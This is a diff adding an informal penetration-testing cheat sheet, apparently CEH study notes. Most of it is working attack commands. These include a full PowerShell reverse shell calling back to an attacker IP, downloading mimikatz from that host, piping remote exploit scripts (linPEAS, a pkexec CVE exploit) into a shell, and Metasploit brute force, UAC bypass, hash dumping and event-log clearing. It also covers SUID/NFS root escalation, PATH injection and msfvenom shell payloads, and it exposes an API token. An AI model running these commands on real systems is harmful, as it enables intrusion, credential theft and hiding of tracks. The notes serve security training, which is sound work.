@@ -1,0 +1,314 @@
+sudo apt-get install rsh-client
+sudo rlogin -l root 10.0.0.1 -p513
+*port-optional
+---------------------------------------
+xfreerdp /v:10.10.31.182 /u:USERNAME /p:PASSWORD /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
+
+nmap --script http-enum -p80
+
+smbclient -L //10.10.0.50/
+smbclient //10.10.0.50/tmp
+smbclient -L //10.10.0.50/ -U '' -N
+
+smbmap -u jsmith -p password1 -d workgroup -H 192.168.0.1
+smbmap -u jsmith -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d' -H 172.16.0.20
+smbmap -u 'apadmin' -p 'asdf1234!' -d ACME -h 10.1.3.30 -x 'net group "Domain Admins" /domain'
+
+smb_brute_metasploit
+------------------------
+>use auxiliary/scanner/smb/smb_login
+>show option  | To get an idea of what to set on
+>set PASS_FILE ./ROKYOU.TXT
+>set rhost {target IP address}     | notes :- rhost means remote host
+>set SMBUser name [of the user] | (generally Administrator is username)
+> run
+
+
+    find . -name flag1.txt: find the file named “flag1.txt” in the current directory
+    find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
+    find / -type d -name config: find the directory named config under “/”
+    find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
+    find / -perm a=x: find executable files
+    find /home -user frank: find all files for user “frank” under “/home”
+    find / -mtime 10: find files that were modified in the last 10 days
+    find / -atime 10: find files that were accessed in the last 10 day
+    find / -cmin -60: find files changed within the last hour (60 minutes)
+    find / -amin -60: find files accesses within the last hour (60 minutes)
+    find / -size 50M: find files with a 50 MB size
+    find / -perm -u=s -type f 2>/dev/null =>suid bit check
+
+enum4linux -u JOY -p sedness -o 10.10.10.12
+----------------------------------------------------------------wordpress--------------------------------------------------------
+wpscan --url http://172.16.0.27:8080/CEH/ -u james -P /path/pass.txt
+wpscan --url http://10.10.156.7  --enumerate u,p --api-token ZuSVj6b6AMzEMk8k2X5a6Q0Zg18LZd0uOWqZVNSewss
+
+msfconsole -q -x 'use auxiliary/scanner/http/wordpress_login_enum;set PASSFILE /home/attacker/HackingWeb/passwords.txt;set RHOSTS 192.168.9.32;set RPORT 8080;set USERNAME admin;set TARGETURI http://192.168.9.32:8080/CEH'
+--------------------------------------------wireshark-----------------------------------------------------------------------------------
+tcp.flags.syn==1 || tcp.flags.ack==1
+http.request.method == POST
+---------------------------------------------------------------------------------------------------------
+SNOW.EXE -C -p "pa$$word" Hiddensecret.txt
+-------------------------------------------------------dvwa_rce------------------------------------------------
+Set-ExecutionPolicy Unrestricted -Scope Global
+
+
+powershell -c "$LHOST = "10.9.80.151"; $LPORT = 8000; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()"
+
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"': This command uses Mimikatz to dump the local Security Account Manager (SAM) database on a local or remote machine. This can be used to obtain password hashes for offline cracking.
+
+
+Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n
+
+Invoke-WebRequest -Method Get -Uri http://10.9.80.151/mimikatz.exe -OutFile mimikatz.exe
+
+xfreerdp /v:10.10.31.182 /u:USERNAME /p:PASSWORD /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+| net user  (Find users)
+ 		       | dir C:\  (directory listing)
+                       | net user Test/Add  (Add a user)
+		       | net user Test      (Check a user)
+		       | net localgroup Administrators Test/Add   (To convert the test account to admin)
+		       | net user Test      (Once again check to see if it has become administrator)
+
+------------------------------------------------msf_post_priv----------------------------------------------------------
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+run post/windows/gather/smart_hashdump
+getsystem -t 1
+
+if access denied
+
+use exploit/windows/local/bypassuac_fodhelper
+set session 1
+set payload/windows/meterpreter/reverse_tcp
+run
+
+getsystem -t 1
+
+access will be granted
+getuid
+run post/windows/gather/smart_hashdump
+
+clearev
+
+exploit -j -z
+sessio -i 1
+
+----------------------------------------polkit-pkexec----------------------------------------------------------
+git clone https://github.com/berdav/CVE-2021-4034.git
+make
+./cve-2021-4034.git
+
+if not
+
+eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"
+
+
+
+------------------------------------------------------nfs/privesc---------------------------------------------
+#from_victim
+
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.90.40
+sudo apt install nfs-kernel-server
+nano /etc/exports
+/home 	*(rw,no_root-squash)
+
+#from_attacker
+
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.90.40
+nmap -sV --script=nfs-showmount 10.0.0.2
+
+sudo apt install nfs-common
+showmout -e 10.0.0.2
+mkdir /tmp/nfs
+sudo mount -t nfs 10.0.0.2:/home /tmp/nfs
+sudo cp /bin/bash /tmp/nfs
+sudo chmod +s /bin/bash
+
+to ubuntu
+cd /home
+/bash -p
+
+--------------if_cp_/bin/bash_not works-----------------------------------
+int main()
+{ setgid(0);
+ setuid(0);
+ system("/bin/bash");
+ return 0;
+}
+------------------------------------------------------------------
+
+
+./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+enjoy root!
+
+path_injection
+-------------
+curl is with SUID bit
+
+echo /bin/bash >/tmp/curl
+
+chmod 777 curl
+
+export PATH=/tmp:$PATH
+
+when curl will be called it  will use the emporary curl instead of curl main binary
+
+---------------------------------------------------------------------------------------------
+
+
+ Risky methods are DELETE, PUT, CONNECT, TRACE and should be disabled
+nmap --script http-methods <target>
+ List email addresses
+nmap --script http-google-email
+ Enumerate common web apps
+nmap --script http-enum -p80
+nmap --script http-sql-injection
+nmap --script dns-zone-transfer.nse -p 53 target
+nmap --script http-enum.nse -p 80,443 target
+nmap --script smb-os-discovery.nse IP 
+nmap --script smb-enum-shares.nse,smb-enum-users.nse -p 139,445 target
+nmap --script snmp-info.nse -p 161 target
+nmap --script snmp-brute.nse -p 161 target
+nmap --script snmp-interfaces.nse -p 161 target
+nmap --script snmp-system-info.nse -p 161 target
+nmap --script http-wordpress-enum.nse -p 80,443 target
+nmap --script sudo -p 22 target
+nmap --script local-checks.nse target
+nmap --script vulscan/vulscan -p- target : kernel exploit
+nmap --script win-privesc-suggester,win-privesc-ms16-032 -p 445 target
+nmap --script http-sql-injection -p 80,443 target
+nmap --script nbstat.nse ip
+nmap --script vuln ip
+nmap --script http-trace -d www.google.com
+nmap -p80 --script http-waf-detect www.google.com
+nmap -n -sP -v <target> :mac scan
+
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.90.40
+
+----------------------------------------------------------------------------------------------------------------
+ldapsearch -x -h ldap_server_ip -b "dc=example,dc=com" -D "cn=admin,dc=example,dc=com" -w password
+nmap --script ldap-search -p 389,636 target
+dig axfr @10.0.0.2 domain.com
+
+---------------------------------------------------------------------------------------------------------------
+
+sudo apt install ent : for entropy checking of a malware//entropy is a randomness of a file
+http://dvwa-ip/hackable/uploads/shell.php
+
+------------------------------------------------------------------------------------------
+pip install pefile
+
+import pefile
+
+file_path = "yourfile.exe"
+
+pe = pefile.PE(file_path)
+entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint
+print(f"Entry Point: 0x{entry_point:08X}")
+
+
+-----------------------------------------------------------------------------------------------------
+Get-FileHash file_name -Algorithm MD5|SHA256|SHA512
+
+yara -w -msg rules file.filetype
+
+theHarvester -d eccounncil -l 200 -b linkedin
+
+snmp-check ip
+
+
+-----------------------------------------------------------------------------------------------
+https://github.com/DarkLycn1976/CEH-Practical-Notes-and-Tools
+Lazys3
+S3Scanner
+
+-------------------------------------------infos----------------------------------------------------
+
+privesc: https://0xsp.com/offensive/privilege-escalation-cheatsheet/
+cheatsheets: https://github.com/rmusser01/Infosec_Reference/tree/master/Draft/Cheat%20sheets%20reference%20pages%20Checklists%20-
+------------------------------------------------------------------------------------------------------------------
+
+     | dir C:\  -- view the files and directories in C:\
+        | net user -- obtain information related to user accounts
+        | net user Mitesh /Add -- it will create user account name Mitesh
+        | net localgroup Admistrators Mitesh /Add 
+----------------------------------------------------msfvenom---------------------------------------------------
+
+List available payloads
+
+msfvenom -l
+Encoding Payloads
+
+msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>
+Handler Setup
+Meterpreter
+
+msfconsole -q
+use exploit/multi/handler
+set PAYLOAD <PAYLOAD>
+set LHOST <IP>
+set LPORT <IP>
+set ExitOnSession false
+exploit -j -z
+Netcat
+
+nc -nlvp <PORT>
+Linux
+Reverse Shell
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
+Bind Shell
+
+msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<IP> LPORT=<PORT> -f elf > shell.elf
+Windows
+Reverse Shell
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
+Bind Shell
+
+msfvenom -p windows/meterpreter/bind_tcp RHOST= <IP> LPORT=<PORT> -f exe > shell.exe
+CMD Shell
+
+msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
+User Creation
+
+msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
+Mac
+Reverse Shell
+
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f macho > shell.macho
+Bind Shell
+
+msfvenom -p osx/x86/shell_bind_tcp RHOST=<IP> LPORT=<PORT> -f macho > shell.macho
+Web Payloads
+PHP
+
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
+cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+ASP
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
+JSP
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
+WAR
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
+Scripting Payloads
+Python
+
+msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py
+Bash
+
+msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh
+Perl
+
+msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl
+elf
+
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.11 LPORT=4444 --platform linux -f elf > /root/Desktop/exploit.elf
+
+mysql -h localhost -u app -p
